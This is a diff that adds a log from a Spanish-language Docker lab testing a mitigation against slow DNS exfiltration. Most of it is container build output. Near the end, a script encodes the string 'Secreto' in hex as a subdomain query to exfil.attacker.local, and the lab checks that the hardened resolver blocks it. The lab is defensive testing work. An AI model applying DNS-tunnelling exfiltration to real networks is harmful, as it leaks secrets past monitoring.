@@ -1,0 +1,141 @@
+========== PUNTO 10 — SLOW DNS EXFIL [MITIGADO] ==========
+time="2026-06-08T12:58:44-05:00" level=warning msg="Docker Compose requires buildx plugin to be installed"
+ Image p10m-resolver Building 
+ Image p10m-attacker-dns Building 
+ Image p10m-host Building 
+ Image p10m-resolver Building 
+ Image p10m-attacker-dns Building 
+ Image p10m-host Building 
+Sending build context to Docker daemon   1.64kB
+Sending build context to Docker daemon   1.64kB
+Sending build context to Docker daemon   1.64kB
+Step 1/9 : FROM python:3.11-slim-bookworm
+Step 1/9 : FROM python:3.11-slim-bookworm
+Step 1/9 : FROM python:3.11-slim-bookworm
+ ---> 8dca233de9f3
+Step 2/9 : RUN apt-get update && apt-get install -y --no-install-recommends     iproute2 iptables tcpdump net-tools iputils-ping dnsutils curl wget openssl     procps arping netcat-openbsd dnsmasq     && rm -rf /var/lib/apt/lists/*
+ ---> 8dca233de9f3
+Step 2/9 : RUN apt-get update && apt-get install -y --no-install-recommends     iproute2 iptables tcpdump net-tools iputils-ping dnsutils curl wget openssl     procps arping netcat-openbsd dnsmasq     && rm -rf /var/lib/apt/lists/*
+ ---> 8dca233de9f3
+Step 2/9 : RUN apt-get update && apt-get install -y --no-install-recommends     iproute2 iptables tcpdump net-tools iputils-ping dnsutils curl wget openssl     procps arping netcat-openbsd dnsmasq     && rm -rf /var/lib/apt/lists/*
+ ---> Using cache
+ ---> 10fcde043905
+Step 3/9 : RUN pip install --no-cache-dir scapy
+ ---> Using cache
+ ---> 10fcde043905
+Step 3/9 : RUN pip install --no-cache-dir scapy
+ ---> Using cache
+ ---> 10fcde043905
+Step 3/9 : RUN pip install --no-cache-dir scapy
+ ---> Using cache
+ ---> 35cffc687ce6
+Step 4/9 : WORKDIR /lab
+ ---> Using cache
+ ---> 35cffc687ce6
+Step 4/9 : WORKDIR /lab
+ ---> Using cache
+ ---> 35cffc687ce6
+Step 4/9 : WORKDIR /lab
+ ---> Using cache
+ ---> c2f864997f4b
+Step 5/9 : COPY scripts/ /lab/
+ ---> Using cache
+ ---> c2f864997f4b
+Step 5/9 : COPY scripts/ /lab/
+ ---> Using cache
+ ---> c2f864997f4b
+Step 5/9 : COPY scripts/ /lab/
+ ---> Using cache
+ ---> 2f3871491221
+Step 6/9 : COPY entrypoint.sh /entrypoint.sh
+ ---> Using cache
+ ---> 2f3871491221
+Step 6/9 : COPY entrypoint.sh /entrypoint.sh
+ ---> Using cache
+ ---> 2f3871491221
+Step 6/9 : COPY entrypoint.sh /entrypoint.sh
+ ---> Using cache
+ ---> 84db1c2701ca
+Step 7/9 : RUN chmod +x /entrypoint.sh
+ ---> Using cache
+ ---> 84db1c2701ca
+Step 7/9 : RUN chmod +x /entrypoint.sh
+ ---> Using cache
+ ---> 84db1c2701ca
+Step 7/9 : RUN chmod +x /entrypoint.sh
+ ---> Using cache
+ ---> 9cac1eee7cf8
+Step 8/9 : ENTRYPOINT ["/entrypoint.sh"]
+ ---> Using cache
+ ---> 9cac1eee7cf8
+Step 8/9 : ENTRYPOINT ["/entrypoint.sh"]
+ ---> Using cache
+ ---> 9cac1eee7cf8
+Step 8/9 : ENTRYPOINT ["/entrypoint.sh"]
+ ---> Using cache
+ ---> 1753f06cd19a
+Step 9/9 : LABEL com.docker.compose.image.builder=classic
+ ---> Using cache
+ ---> 1753f06cd19a
+Step 9/9 : LABEL com.docker.compose.image.builder=classic
+ ---> Using cache
+ ---> 1753f06cd19a
+Step 9/9 : LABEL com.docker.compose.image.builder=classic
+ ---> Using cache
+ ---> affc9d7a80c3
+ ---> Using cache
+ ---> affc9d7a80c3
+Successfully built affc9d7a80c3
+ ---> Using cache
+ ---> affc9d7a80c3
+Successfully built affc9d7a80c3
+Successfully built affc9d7a80c3
+Successfully tagged p10m-resolver:latest
+ Image p10m-resolver Built 
+ Image p10m-resolver Built 
+Successfully tagged p10m-attacker-dns:latest
+ Image p10m-attacker-dns Built 
+ Image p10m-attacker-dns Built 
+Successfully tagged p10m-host:latest
+ Image p10m-host Built 
+ Image p10m-host Built 
+ Network p10m_labnet Creating 
+ Network p10m_labnet Created 
+ Container p10m-resolver-1 Creating 
+ Container p10m-attacker-dns-1 Creating 
+ Container p10m-host-1 Creating 
+ Container p10m-host-1 Created 
+ Container p10m-attacker-dns-1 Created 
+ Container p10m-resolver-1 Created 
+ Container p10m-resolver-1 Starting 
+ Container p10m-attacker-dns-1 Starting 
+ Container p10m-host-1 Starting 
+ Container p10m-attacker-dns-1 Started 
+ Container p10m-host-1 Started 
+ Container p10m-resolver-1 Started 
+[*] Exfiltrando [Secreto] como: 5365637265746f.exfil.attacker.local
+[+] Consulta DNS enviada al resolvedor configurado
+[*] Consultas en DNS atacante (debería estar vacío/bloqueado):
+attacker-dns-1  | dnsmasq[1]: started, version 2.90 cachesize 150
+attacker-dns-1  | dnsmasq[1]: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
+attacker-dns-1  | dnsmasq[1]: warning: no upstream servers configured
+attacker-dns-1  | dnsmasq[1]: read /etc/hosts - 9 names
+resolver-1  | [+] Resolvedor mitigado: dnsmasq + filtro longitud consulta
+resolver-1  | dnsmasq[1]: started, version 2.90 cachesize 150
+resolver-1  | dnsmasq[1]: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
+resolver-1  | dnsmasq[1]: using nameserver 10.9.0.101#53 for domain attacker.local 
+resolver-1  | dnsmasq[1]: read /etc/hosts - 9 names
+ Container p10m-resolver-1 Stopping 
+ Container p10m-attacker-dns-1 Stopping 
+ Container p10m-host-1 Stopping 
+ Container p10m-resolver-1 Stopped 
+ Container p10m-resolver-1 Removing 
+ Container p10m-attacker-dns-1 Stopped 
+ Container p10m-attacker-dns-1 Removing 
+ Container p10m-resolver-1 Removed 
+ Container p10m-attacker-dns-1 Removed 
+ Container p10m-host-1 Stopped 
+ Container p10m-host-1 Removing 
+ Container p10m-host-1 Removed 
+ Network p10m_labnet Removing 
+ Network p10m_labnet Removed 
